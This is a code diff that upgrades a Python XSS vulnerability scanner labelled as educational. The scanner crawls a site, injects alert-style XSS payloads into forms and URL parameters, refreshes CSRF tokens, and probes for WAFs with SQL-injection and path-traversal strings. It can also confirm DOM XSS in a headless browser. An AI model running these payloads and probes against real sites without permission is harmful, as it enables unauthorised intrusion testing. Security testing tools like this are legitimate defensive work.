@@ -1,190 +1,640 @@
 import sys
 import html
 import requests
+import re
+import time
+import json
+import uuid
+import argparse
+import threading
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
 from bs4 import BeautifulSoup
+from typing import List, Dict, Optional, Tuple
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import logging
 
-PAYLOADS = [
-    "<script>alert('XSS')</script>",
-    "\"><img src=x onerror=alert(1)>",
-    "'><svg onload=alert(1)>",
-    "<img src=x onerror=alert('XSS')>",
-    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
-]
+try:
+    from playwright.sync_api import sync_playwright
+    PLAYWRIGHT_AVAILABLE = True
+except ImportError:
+    PLAYWRIGHT_AVAILABLE = False
 
-DANGEROUS_CHARS = ["<", ">", '"', "'"]
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+
 
 HEADERS = {
-    "User-Agent": "Mozilla/5.0 (compatible; SmartXSSScanner/1.0; +educational-use)"
+    "User-Agent": "Mozilla/5.0 (compatible; AdvancedXSSScanner/2.1; +educational-use)",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "keep-alive"
 }
 
-TIMEOUT = 8
-
-def get_forms(url, session):
-    """Fetch a page and return a list of dicts describing each <form>."""
-    try:
-        resp = session.get(url, headers=HEADERS, timeout=TIMEOUT)
-    except requests.RequestException as e:
-        print(f"[!] Could not fetch {url}: {e}")
-        return []
-
-    soup = BeautifulSoup(resp.text, "html.parser")
-    forms = []
-    for form in soup.find_all("form"):
-        action = form.attrs.get("action", "")
-        method = form.attrs.get("method", "get").lower()
-        inputs = []
-        for tag in form.find_all(["input", "textarea", "select"]):
-            name = tag.attrs.get("name")
-            if not name:
-                continue
-            input_type = tag.attrs.get("type", "text")
-            default_value = tag.attrs.get("value", "")
-            inputs.append({"name": name, "type": input_type, "value": default_value})
-        forms.append({"action": action, "method": method, "inputs": inputs})
-    return forms
+TIMEOUT = 10
+MAX_RETRIES = 3
+CONCURRENT_WORKERS = 5
+RATE_LIMIT = 10 
 
 
 
-def submit_form(base_url, form, payload, session):
-    """Fill every input in a form with the payload and submit it."""
-    target_url = urljoin(base_url, form["action"]) if form["action"] else base_url
-    data = {}
-    for field in form["inputs"]:
-        if field["type"] in ("submit", "button", "hidden"):
-            data[field["name"]] = field["value"]
-        else:
-            data[field["name"]] = payload
+class PayloadGenerator:
+    """Generate XSS payloads for different contexts."""
 
-    try:
-        if form["method"] == "post":
-            return session.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT)
-        else:
-            return session.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT)
-    except requests.RequestException as e:
-        print(f"[!] Request failed for {target_url}: {e}")
+    @staticmethod
+    def get_base_payloads():
+        return [
+            "<script>alert('XSS')</script>",
+            "<script>alert(1)</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "\"><img src=x onerror=alert(1)>",
+            "'><img src=x onerror=alert(1)>",
+            "<img src=x onerror=alert('XSS')>",
+            "<body onload=alert(1)>",
+            "<svg onload=alert(1)>",
+            "<div onmouseover=alert(1)>hover</div>",
+            "\" onmouseover=alert('XSS') \"",
+            "' onfocus=alert('XSS') autofocus",
+            "\" onerror=alert('XSS') \"",
+            "';alert(1);//",
+            "\"><script>alert(1)</script>",
+        ]
+
+    @staticmethod
+    def get_all_payloads(max_payloads=30):
+       
+        base = PayloadGenerator.get_base_payloads()
+        return list(dict.fromkeys(base))[:max_payloads]
+
+    @staticmethod
+    def make_marker_payload(base_payload, marker):
+        """Embed a unique marker inside a payload so reflection can be tied
+        back to the exact injection, avoiding cross-payload false matches."""
+        return base_payload.replace("XSS", marker) if "XSS" in base_payload else f"{marker}{base_payload}"
+
+
+class RateLimiter:
+    """Thread-safe rate limiter shared across scan threads."""
+
+    def __init__(self, requests_per_second=RATE_LIMIT):
+        self.min_interval = 1.0 / requests_per_second
+        self.last_request_time = 0.0
+        self._lock = threading.Lock()
+
+    def wait(self):
+        with self._lock:
+            now = time.time()
+            elapsed = now - self.last_request_time
+            if elapsed < self.min_interval:
+                time.sleep(self.min_interval - elapsed)
+            self.last_request_time = time.time()
+
+
+class AdvancedXSSScanner:
+    def __init__(self, target_url, delay=0.5, verbose=False, output_format='text',
+                 crawl_depth=1, parallel=False, verify_dom=False, max_payloads=20):
+        self.target_url = target_url
+        self.delay = delay
+        self.verbose = verbose
+        self.output_format = output_format
+        self.crawl_depth = crawl_depth
+        self.parallel = parallel
+        self.verify_dom = verify_dom
+
+        self.session = requests.Session()
+        self.session.headers.update(HEADERS)
+        self.rate_limiter = RateLimiter()
+        self.findings = []
+        self.visited_urls = set()
+        self.visited_lock = threading.Lock()
+        self.findings_lock = threading.Lock()
+        self.payloads = PayloadGenerator.get_all_payloads(max_payloads)
+
+        self.dom_xss_findings = []
+        self.waf_info = {}
+
+    def log(self, message, level='info'):
+        if self.verbose or level in ('warning', 'error'):
+            logger.log(getattr(logging, level.upper()), message)
+
+    def add_finding(self, finding):
+        with self.findings_lock:
+            self.findings.append(finding)
+
+
+    def safe_request(self, url, method='GET', data=None, params=None, allow_error_status=False):
+        """Make a request with retry + backoff.
+
+        Deliberately does NOT call raise_for_status(): callers that need to
+        inspect 4xx/5xx (e.g. WAF detection) must see the real response.
+        Timeouts are handled by requests' own `timeout=` kwarg, which works
+        correctly from any thread (unlike a signal-based decorator).
+        """
+        self.rate_limiter.wait()
+
+        last_exc = None
+        for attempt in range(MAX_RETRIES):
+            try:
+                if method.upper() == 'POST':
+                    response = self.session.post(url, data=data, params=params,
+                                                  timeout=TIMEOUT, allow_redirects=True)
+                else:
+                    response = self.session.get(url, params=params,
+                                                 timeout=TIMEOUT, allow_redirects=True)
+
+                if not allow_error_status and response.status_code >= 500:
+                    last_exc = f"HTTP {response.status_code}"
+                    time.sleep(2 ** attempt)
+                    continue
+                return response
+
+            except requests.RequestException as e:
+                last_exc = e
+                if attempt < MAX_RETRIES - 1:
+                    time.sleep(2 ** attempt)
+
+        self.log(f"Request failed for {url} after {MAX_RETRIES} attempts: {last_exc}", 'error')
         return None
 
 
-def inject_url_params(url, payload, session):
-    """Inject the payload into every existing query parameter of a URL."""
-    parsed = urlparse(url)
-    params = parse_qs(parsed.query)
+    def extract_forms(self, url):
+        response = self.safe_request(url)
+        if not response:
+            return []
 
-    if not params:
-        return None  
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = []
+        csrf_patterns = ['csrf', 'token', 'authenticity_token', '_token', 'xsrf']
 
-    results = []
-    for param_name in params:
-        new_params = {k: v[0] for k, v in params.items()}
-        new_params[param_name] = payload
-        new_query = urlencode(new_params)
-        fuzzed_url = urlunparse(parsed._replace(query=new_query))
-        try:
-            resp = session.get(fuzzed_url, headers=HEADERS, timeout=TIMEOUT)
-            results.append((param_name, fuzzed_url, resp))
-        except requests.RequestException as e:
-            print(f"[!] Request failed for {fuzzed_url}: {e}")
-    return results
+        for form in soup.find_all('form'):
+            action = form.attrs.get('action', '')
+            method = form.attrs.get('method', 'get').lower()
+            inputs = []
+            for tag in form.find_all(['input', 'textarea', 'select']):
+                name = tag.attrs.get('name')
+                if not name:
+                    continue
+                input_type = tag.attrs.get('type', 'text')
+                default_value = tag.attrs.get('value', '')
+                is_csrf = any(p in name.lower() for p in csrf_patterns)
+                inputs.append({
+                    'name': name,
+                    'type': 'hidden' if is_csrf else input_type,
+                    'value': default_value,
+                    'csrf': is_csrf,
+                })
+            forms.append({'action': action, 'method': method, 'inputs': inputs})
+        return forms
+
+    def refresh_csrf(self, base_url, form):
+        """Re-fetch the page and pull a fresh CSRF token before each
+        submission. v2.0 grabbed the token once and reused it across many
+        submissions in a loop, which silently fails against apps that
+        rotate tokens per-request."""
+        fresh_forms = self.extract_forms(base_url)
+        for f in fresh_forms:
+            if f['action'] == form['action'] and f['method'] == form['method']:
+                for field in f['inputs']:
+                    if field.get('csrf'):
+                        return field['name'], field['value']
+        return None, None
 
 
-def is_reflected_unescaped(response_text, payload):
-    """
-    Return True if the raw, unescaped payload appears in the response.
-    This means the app is NOT HTML-escaping user input -> likely XSS.
-    """
-    if payload in response_text:
-        return True
+    def get_baseline(self, url):
+        """Fetch the page once with no payload so we know what 'normal'
+        content looks like, to reduce false positives from content that
+        always contains angle brackets (e.g. a code sample on the page)."""
+        resp = self.safe_request(url)
+        return resp.text if resp else ""
 
-    # Also check if it was reflected but properly escaped (safe) so we can
-    # tell the difference in the report.
-    escaped_payload = html.escape(payload)
-    if escaped_payload in response_text and payload not in response_text:
-        return False
+    def is_reflected_unescaped(self, response_text, payload, baseline=""):
+        if not response_text or not payload:
+            return False
+        if payload in baseline:
+            return False  
+        return payload in response_text
 
-    return False
+    def detect_injection_context(self, response, injection_point):
+        contexts = {
+            'in_script': re.search(r'<script[^>]*>[^<]*' + re.escape(injection_point) + r'[^<]*</script>', response),
+            'in_attribute': re.search(r'"[^"]*' + re.escape(injection_point) + r'[^"]*"', response),
+            'in_html': re.search(r'<[^>]*' + re.escape(injection_point) + r'[^>]*>', response),
+        }
+        for context, match in contexts.items():
+            if match:
+                return context
+        return 'unknown'
+
+    def submit_form(self, base_url, form, payload):
+        target_url = urljoin(base_url, form['action']) if form['action'] else base_url
+        data = {}
+        csrf_field, csrf_value = None, None
+        for field in form['inputs']:
+            if field.get('csrf'):
+                csrf_field, csrf_value = field['name'], field['value']
 
 
-def scan_forms(base_url, session, findings):
-    print(f"\n[*] Extracting forms from {base_url} ...")
-    forms = get_forms(base_url, session)
-    print(f"[*] Found {len(forms)} form(s).")
+        if csrf_field:
+            fresh_name, fresh_value = self.refresh_csrf(base_url, form)
+            if fresh_value:
+                csrf_value = fresh_value
 
-    for form in forms:
-        for payload in PAYLOADS:
-            resp = submit_form(base_url, form, payload, session)
-            if resp is None:
+        for field in form['inputs']:
+            if field.get('csrf'):
+                data[field['name']] = csrf_value
+            elif field['type'] in ('submit', 'button', 'reset'):
+                data[field['name']] = field['value']
+            else:
+                data[field['name']] = payload
+
+        if form['method'] == 'post':
+            return self.safe_request(target_url, method='POST', data=data)
+        return self.safe_request(target_url, method='GET', params=data)
+
+    def inject_url_params(self, url, payload):
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        if not params:
+            return []
+        results = []
+        for param_name in params:
+            new_params = {k: v[0] for k, v in params.items()}
+            new_params[param_name] = payload
+            fuzzed_url = urlunparse(parsed._replace(query=urlencode(new_params)))
+            response = self.safe_request(fuzzed_url)
+            if response:
+                results.append((param_name, fuzzed_url, response))
+        return results
+
+
+
+    def extract_links(self, html_content):
+        soup = BeautifulSoup(html_content, 'html.parser')
+        links = []
+        parsed_target = urlparse(self.target_url)
+        for a in soup.find_all('a', href=True):
+            href = a['href']
+            if href.startswith('javascript:'):
                 continue
-            vulnerable = is_reflected_unescaped(resp.text, payload)
-            if vulnerable:
-                findings.append({
-                    "type": "form",
-                    "action": form["action"] or base_url,
-                    "method": form["method"],
-                    "payload": payload,
-                    "fields": [f["name"] for f in form["inputs"]],
-                })
-                break  
+            if href.startswith(('http://', 'https://')):
+                links.append(href)
+            elif href.startswith('/'):
+                links.append(f"{parsed_target.scheme}://{parsed_target.netloc}{href}")
+        return list(set(links))
 
+    def crawl(self, url, depth=0):
+        with self.visited_lock:
+            if depth > self.crawl_depth or url in self.visited_urls:
+                return
+            self.visited_urls.add(url)
 
-def scan_url_params(url, session, findings):
-    print(f"\n[*] Fuzzing URL query parameters on {url} ...")
-    for payload in PAYLOADS:
-        results = inject_url_params(url, payload, session)
-        if not results:
-            print("[*] No query parameters found to fuzz.")
+        response = self.safe_request(url)
+        if not response:
             return
-        for param_name, fuzzed_url, resp in results:
-            if is_reflected_unescaped(resp.text, payload):
-                findings.append({
-                    "type": "url_param",
-                    "param": param_name,
-                    "url": fuzzed_url,
-                    "payload": payload,
-                })
+        for link in self.extract_links(response.text):
+            if urlparse(link).netloc == urlparse(self.target_url).netloc:
+                self.crawl(link, depth + 1)
+
+    def detect_waf(self, url):
+        self.log(f"[*] Checking for WAF on {url}")
+        waf_signatures = {
+            'Cloudflare': ['cf-ray', 'cloudflare'],
+            'Akamai': ['akamai'],
+            'Imperva': ['x-iinfo', 'incapsula'],
+            'F5': ['x-wa-info'],
+            'AWS WAF': ['x-amzn-requestid'],
+            'Sucuri': ['x-sucuri-id'],
+        }
+        test_payloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../etc/passwd"]
+        waf_detected = []
+
+        for payload in test_payloads:
+            response = self.safe_request(url, params={'test': payload}, allow_error_status=True)
+            if not response:
+                continue
+            for header, value in response.headers.items():
+                header_lower = header.lower()
+                for waf_name, sigs in waf_signatures.items():
+                    if any(s in header_lower or s in value.lower() for s in sigs):
+                        waf_detected.append({'name': waf_name, 'header': header, 'value': value})
+            if response.status_code in (403, 406, 501, 503):
+                waf_detected.append({'name': 'Unknown WAF', 'status_code': response.status_code})
+
+        return waf_detected
+
+    def scan_forms(self):
+        self.log(f"[*] Extracting forms from {self.target_url}")
+        forms = self.extract_forms(self.target_url)
+        self.log(f"[*] Found {len(forms)} form(s)")
+        baseline = self.get_baseline(self.target_url)
+
+        for form in forms:
+            for payload in self.payloads:
+                response = self.submit_form(self.target_url, form, payload)
+                if not response:
+                    continue
+                if self.is_reflected_unescaped(response.text, payload, baseline):
+                    context = self.detect_injection_context(response.text, payload)
+                    self.add_finding({
+                        'type': 'reflected_xss',
+                        'source': 'form',
+                        'action': form['action'] or self.target_url,
+                        'method': form['method'],
+                        'payload': payload,
+                        'fields': [f['name'] for f in form['inputs']],
+                        'context': context,
+                        'timestamp': datetime.now().isoformat(),
+                        'status_code': response.status_code,
+                    })
+                    self.log(f"[!] XSS found in form: {payload[:50]}...", 'warning')
+                    break
+
+    def scan_url_params(self):
+        self.log("[*] Fuzzing URL query parameters")
+        parsed = urlparse(self.target_url)
+        if not parse_qs(parsed.query):
+            self.log("[*] No query parameters found")
+            return
+        baseline = self.get_baseline(self.target_url)
+
+        for payload in self.payloads:
+            for param_name, fuzzed_url, response in self.inject_url_params(self.target_url, payload):
+                if self.is_reflected_unescaped(response.text, payload, baseline):
+                    context = self.detect_injection_context(response.text, payload)
+                    self.add_finding({
+                        'type': 'reflected_xss',
+                        'source': 'url_param',
+                        'param': param_name,
+                        'url': fuzzed_url,
+                        'payload': payload,
+                        'context': context,
+                        'timestamp': datetime.now().isoformat(),
+                        'status_code': response.status_code,
+                    })
+                    self.log(f"[!] XSS found in URL param: {param_name}", 'warning')
+
+    def scan_waf(self):
+        detected = self.detect_waf(self.target_url)
+        self.waf_info = {'detected': detected}
+        if detected:
+            self.log(f"[!] WAF detected: {detected[0]['name']}", 'warning')
+
+    def scan_dom_with_browser(self):
+        """Real DOM-XSS verification using a headless browser.
+
+        This replaces the v2.0 approach of grepping for sink/source strings
+        anywhere in the page (which mostly flags code that's never even
+        reachable with attacker input). Instead, for each candidate URL we:
+          1. Load it in headless Chromium via Playwright.
+          2. Register a dialog handler that auto-dismisses and records
+             alert()/confirm()/prompt() calls.
+          3. Re-load the page with each payload appended as a URL fragment
+             / query value and see if a dialog actually fires.
+        This only confirms vulnerabilities reachable via the URL (typical
+        DOM XSS via location.hash/search) - it won't find sinks fed by
+        other sources like postMessage.
+        """
+        if not PLAYWRIGHT_AVAILABLE:
+            self.log(
+                "[!] Playwright not installed - skipping DOM verification. "
+                "Install with: pip install playwright && playwright install chromium",
+                'warning'
+            )
+            return
+
+        self.log(f"[*] Verifying DOM XSS on {self.target_url} with headless browser")
+        triggered = []
+
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            page = browser.new_page()
+
+            def handle_dialog(dialog):
+                triggered.append(dialog.message)
+                dialog.dismiss()
+
+            page.on("dialog", handle_dialog)
+
+            base_payloads = [
+                "<script>alert('DOMXSS')</script>",
+                "<img src=x onerror=alert('DOMXSS')>",
+                "'-alert('DOMXSS')-'",
+                "\" onerror=\"alert('DOMXSS');//", 
+                "' onerror='alert(\"DOMXSS\");//",
+                "\" onload=\"alert('DOMXSS');//",
+                "' onload='alert(\"DOMXSS\");//",
+            ]
+
+            for payload in base_payloads:
+                triggered.clear()
+                test_url = f"{self.target_url}#{payload}"
+                try:
+                    page.goto("about:blank")
+                    page.goto(test_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
+                    page.wait_for_timeout(1500)
+                except Exception as e:
+                    self.log(f"[!] Playwright navigation failed for {test_url}: {e}", 'error')
+                    
+                    if not triggered:
+                        continue
+
+                if triggered:
+                    self.add_finding({
+                        'type': 'dom_xss_confirmed',
+                        'url': test_url,
+                        'payload': payload,
+                        'evidence': f"alert() fired with: {triggered[0]}",
+                        'timestamp': datetime.now().isoformat(),
+                    })
+                    self.log(f"[!] CONFIRMED DOM XSS via location.hash: {payload}", 'warning')
 
 
-def print_report(findings):
-    print("\n" + "=" * 60)
-    print("SCAN REPORT")
-    print("=" * 60)
+                parsed = urlparse(self.target_url)
+                params = parse_qs(parsed.query)
+                for param_name in params:
+                    triggered.clear()
+                    new_params = {k: v[0] for k, v in params.items()}
+                    new_params[param_name] = payload
+                    fuzzed_url = urlunparse(parsed._replace(query=urlencode(new_params)))
+                    try:
+                        page.goto("about:blank")
+                        page.goto(fuzzed_url, timeout=TIMEOUT * 1000, wait_until="domcontentloaded")
+                        page.wait_for_timeout(1500)
+                    except Exception as e:
+                        self.log(f"[!] Playwright navigation failed for {fuzzed_url}: {e}", 'error')
+                        if not triggered:
+                            continue
+                    if triggered:
+                        self.add_finding({
+                            'type': 'dom_xss_confirmed',
+                            'url': fuzzed_url,
+                            'param': param_name,
+                            'payload': payload,
+                            'evidence': f"alert() fired with: {triggered[0]}",
+                            'timestamp': datetime.now().isoformat(),
+                        })
+                        self.log(f"[!] CONFIRMED DOM XSS via param '{param_name}': {payload}", 'warning')
 
-    if not findings:
-        print("No unescaped reflections found with the tested payloads.")
-        print("(This does NOT guarantee the app is safe — try more payloads,")
-        print(" check DOM-based sinks with a headless browser, and test")
-        print(" stored/blind XSS separately.)")
-        return
+            browser.close()
 
-    for i, f in enumerate(findings, 1):
-        print(f"\n[VULN {i}] Likely Reflected XSS")
-        if f["type"] == "form":
-            print(f"  Form action : {f['action']}")
-            print(f"  Method      : {f['method'].upper()}")
-            print(f"  Fields      : {', '.join(f['fields'])}")
+
+    def scan_sequential(self):
+        self.scan_forms()
+        self.scan_url_params()
+        self.scan_waf()
+        if self.verify_dom:
+            self.scan_dom_with_browser()
+
+    def scan_parallel_safe(self):
+        """Run the HTTP-only scans in parallel threads. Playwright's
+        sync API is NOT thread-safe, so DOM verification always runs
+        afterward, sequentially, on the main thread."""
+        with ThreadPoolExecutor(max_workers=CONCURRENT_WORKERS) as executor:
+            futures = {
+                executor.submit(self.scan_forms): 'forms',
+                executor.submit(self.scan_url_params): 'url_params',
+                executor.submit(self.scan_waf): 'waf',
+            }
+            for future in as_completed(futures):
+                name = futures[future]
+                try:
+                    future.result(timeout=120)
+                    self.log(f"[*] {name} scan completed")
+                except Exception as e:
+                    self.log(f"[!] {name} scan failed: {e}", 'error')
+
+        if self.verify_dom:
+            self.scan_dom_with_browser()
+
+    def scan(self):
+        print(f"\n[*] Starting Advanced XSS Scan on {self.target_url}")
+        print(f"[*] Using {len(self.payloads)} payloads | depth={self.crawl_depth} | "
+              f"parallel={self.parallel} | verify_dom={self.verify_dom}")
+        print("[*]" + "=" * 60)
+
+        start_time = time.time()
+        self.crawl(self.target_url)
+        self.log(f"[*] Crawled {len(self.visited_urls)} page(s)")
+
+        if self.parallel:
+            self.scan_parallel_safe()
         else:
-            print(f"  URL param   : {f['param']}")
-            print(f"  Test URL    : {f['url']}")
-        print(f"  Payload     : {f['payload']}")
-        print("  Fix         : HTML-encode all user input before rendering it,")
-        print("                e.g. Python: html.escape(user_input)")
-        print("                Flask/Jinja2 autoescaping is ON by default —")
-        print("                make sure you aren't using |safe on user data.")
+            self.scan_sequential()
 
+        elapsed = time.time() - start_time
+        report = self.generate_report()
+
+        print("\n" + "=" * 60)
+        print(f"SCAN COMPLETED in {elapsed:.2f}s | Findings: {len(self.findings)}")
+        print("=" * 60)
+        return report
+
+
+    def generate_report(self):
+        if self.output_format == 'json':
+            return json.dumps({
+                'target': self.target_url,
+                'timestamp': datetime.now().isoformat(),
+                'findings': self.findings,
+                'waf': self.waf_info,
+            }, indent=2)
+        return self.generate_text_report()
+
+    def generate_text_report(self):
+        report = []
+        report.append("=" * 70)
+        report.append("XSS VULNERABILITY SCAN REPORT")
+        report.append("=" * 70)
+        report.append(f"Target: {self.target_url}")
+        report.append(f"Timestamp: {datetime.now().isoformat()}")
+        report.append("")
+
+        confirmed = [f for f in self.findings if f['type'] == 'dom_xss_confirmed']
+        reflected = [f for f in self.findings if f['type'] == 'reflected_xss']
+
+        report.append("SUMMARY")
+        report.append("-" * 40)
+        report.append(f"Confirmed DOM XSS (browser-verified): {len(confirmed)}")
+        report.append(f"Likely Reflected XSS (unescaped):     {len(reflected)}")
+        report.append("")
+
+        if self.waf_info.get('detected'):
+            report.append("WAF DETECTED")
+            report.append("-" * 40)
+            for waf in self.waf_info['detected']:
+                report.append(f"  - {waf.get('name', 'Unknown')}")
+            report.append("")
+
+        if not self.findings:
+            report.append("No vulnerabilities found with the tested payloads.")
+            report.append("This does NOT guarantee the application is secure.")
+        else:
+            report.append("DETAILED FINDINGS")
+            report.append("-" * 40)
+            for i, f in enumerate(self.findings, 1):
+                report.append(f"\n[{i}] {f['type'].upper()}")
+                for key in ('url', 'action', 'param', 'method', 'payload', 'evidence', 'context'):
+                    if f.get(key):
+                        report.append(f"    {key}: {f[key]}")
+
+        report.append("")
+        report.append("RECOMMENDATIONS")
+        report.append("-" * 40)
+        report.append("  1. HTML-encode all user input before rendering (html.escape() / autoescaping)")
+        report.append("  2. Set a Content-Security-Policy header")
+        report.append("  3. Avoid innerHTML/document.write with untrusted data; use textContent")
+        report.append("  4. Set HttpOnly + Secure flags on cookies")
+        report.append("  5. Re-test after fixes with this scanner + manual review")
+
+        return "\n".join(report)
+
+
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(
+        description='Advanced XSS Vulnerability Scanner (Educational) v2.1',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 xss_scanner_v2.py http://localhost:3000
+  python3 xss_scanner_v2.py "http://target/page?id=1" --verify-dom
+  python3 xss_scanner_v2.py http://target.com --parallel --format json -o report.json
+        """
+    )
+    parser.add_argument('url', help='Target URL to scan')
+    parser.add_argument('--output', '-o', help='Output file for results')
+    parser.add_argument('--format', '-f', choices=['text', 'json'], default='text')
+    parser.add_argument('--verbose', '-v', action='store_true')
+    parser.add_argument('--depth', type=int, default=1, help='Crawl depth (default: 1)')
+    parser.add_argument('--parallel', action='store_true', help='Run HTTP scans concurrently')
+    parser.add_argument('--verify-dom', action='store_true',
+                         help='Confirm DOM XSS by executing payloads in headless Chromium (requires playwright)')
+    parser.add_argument('--max-payloads', type=int, default=20,
+                         help='Cap on number of payloads tried per injection point (default: 20)')
+    return parser.parse_args()
 
 
 def main():
-    if len(sys.argv) != 2:
-        print("Usage: python3 xss_scanner.py <target_url>")
-        sys.exit(1)
+    args = parse_arguments()
+    scanner = AdvancedXSSScanner(
+        target_url=args.url,
+        verbose=args.verbose,
+        output_format=args.format,
+        crawl_depth=args.depth,
+        parallel=args.parallel,
+        verify_dom=args.verify_dom,
+        max_payloads=args.max_payloads,
+    )
+    report = scanner.scan()
 
-    target_url = sys.argv[1]
-    session = requests.Session()
-    findings = []
-
-    scan_forms(target_url, session, findings)
-    scan_url_params(target_url, session, findings)
-    print_report(findings)
+    if args.output:
+        with open(args.output, 'w', encoding='utf-8') as f:
+            f.write(report)
+        print(f"\n[*] Report saved to {args.output}")
+    else:
+        print(report)
 
 
 if __name__ == "__main__":
